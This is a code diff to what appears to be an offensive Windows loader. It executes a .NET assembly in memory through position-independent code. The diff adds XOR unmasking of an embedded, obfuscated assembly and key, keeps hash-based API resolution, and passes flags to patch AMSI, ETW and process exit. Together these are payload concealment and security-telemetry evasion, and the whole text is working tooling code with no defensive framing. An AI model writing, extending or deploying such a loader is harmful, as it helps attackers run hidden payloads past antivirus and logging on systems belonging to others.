@@ -18,19 +18,21 @@ WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, 
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
 
-FARPROC resolve(DWORD modHash, DWORD funcHash) {
-    HANDLE hModule = findModuleByHash(modHash);
-    return findFunctionByHash(hModule, funcHash);
-}
+// Debugging Only
+WINBASEAPI VOID WINAPI KERNEL32$DebugBreak();
+WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
 
-FARPROC resolve_unloaded(char * mod, char * func) {
-  HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
-  if (hModule == NULL) {
-    hModule = KERNEL32$LoadLibraryA(mod);
-  }
-  return KERNEL32$GetProcAddress(hModule, func);
-}
 
+/**
+ * Linked resources
+ */
+char __PICODATA__[0] __attribute__((section("my_pico")));
+char __ASSEMBLY__[0] __attribute__((section("my_assembly")));
+char __KEYDATA__[0] __attribute__((section("my_key")));
+
+/**
+ * Structs
+ */
 typedef HRESULT (*EXECUTE_ASSEMBLY_PICO)(
     char *assembly, 
     size_t assembly_len, 
@@ -53,16 +55,64 @@ typedef struct {
     char  buf[];
 } _ASSEMBLY;
 
-char __PICODATA__[0] __attribute__((section("my_pico")));
-char __ASSEMBLY__[0] __attribute__((section("my_assembly")));
-  
 char * findAppendedPICO() {
     return (char *)&__PICODATA__;
 }
 
-_ASSEMBLY * findAppendedAssembly() {
-    return (_ASSEMBLY *)&__ASSEMBLY__;
+char * findAppendedAssembly() {
+    return (char *)&__ASSEMBLY__;
 }
+
+char * findAppendedKey() {
+    return (char *)&__KEYDATA__;
+}
+
+/*
+ * Our embedded resources are masked, so we need to unmask them.
+ */
+typedef struct {
+    int   length;
+    char  value[];
+} _RESOURCE;
+ 
+char * unmask(char * srcData) {
+    _RESOURCE * key;
+    _RESOURCE * src;
+    char      * dst;
+ 
+    /* parse our preplen + xor'd $KEY and our masked data too */
+    key = (_RESOURCE *)findAppendedKey();
+    src = (_RESOURCE *)srcData;
+ 
+    /* allocate memory for our unmasked content */
+    dst = KERNEL32$VirtualAlloc( NULL, src->length, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
+ 
+    /* unmask it */
+    for (int x = 0; x < src->length; x++) {
+        dst[x] = src->value[x] ^ key->value[x % key->length];
+    }
+ 
+    return dst;
+}
+
+
+
+/**
+ * Helpers
+ */
+FARPROC resolve(DWORD modHash, DWORD funcHash) {
+    HANDLE hModule = findModuleByHash(modHash);
+    return findFunctionByHash(hModule, funcHash);
+}
+
+FARPROC resolve_unloaded(char * mod, char * func) {
+  HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
+  if (hModule == NULL) {
+    hModule = KERNEL32$LoadLibraryA(mod);
+  }
+  return KERNEL32$GetProcAddress(hModule, func);
+}
+
 
 void run_clr_pico(
     WIN32FUNCS * funcs, 
@@ -87,23 +137,28 @@ void run_clr_pico(
     /* And, we can call our pico entry point */
     EXECUTE_ASSEMBLY_PICO entryPoint = (EXECUTE_ASSEMBLY_PICO) PicoEntryPoint(srcPico, dstCode);
     
-    _ASSEMBLY *assembly = findAppendedAssembly();
+    /* Get length-prefixed resource */
+    _RESOURCE* masked_assembly = (_RESOURCE*)findAppendedAssembly();
+    SIZE_T     assembly_len    = masked_assembly->length;
+
+    /* Unmask the assembly resource */
+    char* assembly = unmask(masked_assembly);
     
     /* Off we go! */
     HRESULT result = entryPoint(
-        assembly->buf, 
-        assembly->len, 
+        assembly, 
+        assembly_len, 
         assemblyArgs, 
         assemblyArgLen,
         patchExitFlag,
         patchAmsiflag,
         patchEtwflag
     );
-    //dprintf("Execute assembly result: 0x%x\n", result);
 
     /* free everything... */
     funcs->VirtualFree(dstData, 0, MEM_RELEASE);
     funcs->VirtualFree(dstCode, 0, MEM_RELEASE);
+    funcs->VirtualFree(assembly, 0, MEM_RELEASE);
 }
 
 void go() 
